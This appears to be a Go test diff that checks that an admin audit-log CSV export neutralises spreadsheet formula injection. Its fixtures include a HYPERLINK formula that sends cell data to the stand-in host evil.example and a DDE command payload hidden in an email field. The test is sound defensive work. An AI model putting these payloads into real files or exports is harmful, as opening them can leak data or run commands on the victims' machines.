@@ -121,3 +121,42 @@ func TestAdminExportAuditLogs_CSV(t *testing.T) {
 		t.Errorf("export audit filter = %v", f)
 	}
 }
+
+func TestAdminExportAuditLogs_NeutralisesFormulas(t *testing.T) {
+	store := &memAuditStore{}
+	store.entries = append(store.entries, audit.Entry{
+		ID: 1, CreatedAt: time.Date(2026, 9, 30, 0, 0, 0, 0, time.UTC),
+		Record: audit.Record{
+			Service: audit.ServiceAuth, Action: "user.login.failed", Result: audit.ResultFailure,
+			Error:       `=HYPERLINK("http://evil.example/?x="&A1,"click")`,
+			TargetEmail: "=cmd|' /C calc'!A0@example.com",
+			TargetID:    "+1-555",
+			Path:        "-/api/v1/auth/login",
+			After:       json.RawMessage(`@{"reason":"password_mismatch"}`),
+			RequestIP:   "\t10.0.0.1",
+		},
+	})
+	h := &AuthHandler{auditStore: store}
+	w := httptest.NewRecorder()
+	h.AdminExportAuditLogs(w, exportRequest(auth.PermissionMatrix{"*": {"admin.audit.export"}}, ""))
+	rows, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(w.Body.String(), "\xEF\xBB\xBF"))).ReadAll()
+	if err != nil {
+		t.Fatalf("csv parse: %v", err)
+	}
+	row := rows[1]
+	for col, want := range map[int]string{
+		5:  `'=HYPERLINK("http://evil.example/?x="&A1,"click")`,
+		12: "'=cmd|' /C calc'!A0@example.com",
+		11: "'+1-555",
+		15: "'-/api/v1/auth/login",
+		17: `'@{"reason":"password_mismatch"}`,
+		13: "'\t10.0.0.1",
+	} {
+		if row[col] != want {
+			t.Errorf("column %d = %q, want %q", col, row[col], want)
+		}
+	}
+	if row[3] != "user.login.failed" || row[2] != audit.ServiceAuth {
+		t.Errorf("ordinary cells must be untouched: %v", row)
+	}
+}
